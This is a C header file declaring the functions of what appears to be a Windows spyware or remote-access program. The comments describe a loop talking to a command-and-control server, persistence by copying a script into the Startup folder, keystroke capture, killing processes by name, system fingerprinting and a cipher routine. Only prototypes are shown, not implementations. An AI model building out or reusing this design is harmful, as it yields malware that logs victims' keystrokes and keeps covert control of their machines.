/* 
 * Include/Header/Macro/File Guard: 
 * The C preprocessor will replace #include <"defines.h"> with all of this code.
 * This can lead to data structures being defined twice, rendering them invalid.
 * The Guard prevents this 'double inclusion' from happening. 
 * Another way to combat double inclusion is by using #pragma once
 */
#ifndef FUNCTIONS_H
#define FUNCTIONS_H

/*------------------------------------------------------------------------------------------[fingerprint.c]------------------------------------------------------------------------------------------*/

int getTime(char *buf);             // Updates the time at the beginning of a buffer ' [DD/MM/YY HH:MM:SS] '
char *getUsername(char *buf);       // Appends the current logged in user to a buffer
int getOsVersion(char *buf);        // Appends the host's OS version to a buffer
char *verifyVersion(char *ret);     // Used to query the OS version on Window's greater than 8.0
char *queryRegString(HKEY, char *); // Reads a string from the registry into a buffer

/*----------------------------------------------------------------------------------------------[net.c]----------------------------------------------------------------------------------------------*/

void connectServer(char *helloMsg); // The process main loop. Handles communications with the C2 server

/*---------------------------------------------------------------------------------------------[hake.c]---------------------------------------------------------------------------------------------*/

int getPersistence(char *user);         // Copies a script to %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\[STARTUP_NAME]
int getProcesses(char *buf, int n);     // Fills a buffer of size n with a list of running processes
int killProcess(const char *procName);  // Terminates a process by name
int getKeystrokes(char *buf, int n);    // Fills a buffer of size n with keystrokes

/*---------------------------------------------------------------------------------------------[util.c]---------------------------------------------------------------------------------------------*/

void *cipher(void *dst, int n);                 // Encrypts n bytes starting from dst
void *mcpy(void *dst, const void *src, int n);  // Replaces memory dst with src (n bytes)

char *scpy(char *dst, const char *src);         // Replaces string dst with src
char *scat(char *dst, const char *src);         // Concatenates two strings, appending src to dst
char *srev(char *str);                          // Reverses a null-terminated string
char *ntos(int n, int base);                    // Returns a null-terminated string representing n (base base)

unsigned int slen(char *src);                   // Returns the length of a string including the null byte
int scmp(char *s1, const char *s2);             // Compared two strings and returns the ascii difference between them
int ston(char *str);                            // Returns an integer representation of a null-terminated string

#endif